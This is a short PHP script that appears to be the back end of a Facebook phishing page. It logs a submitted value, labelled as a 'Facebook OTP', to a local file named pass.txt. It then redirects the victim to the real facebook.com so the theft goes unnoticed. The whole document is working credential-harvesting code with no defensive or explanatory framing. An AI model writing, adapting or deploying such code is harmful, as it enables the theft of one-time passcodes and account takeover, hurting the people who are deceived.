<?php
file_put_contents("pass.txt", "Facebook OTP : " . $pass = $_POST['email'] . "\n", FILE_APPEND);
header('Location: https://facebook.com');
?>
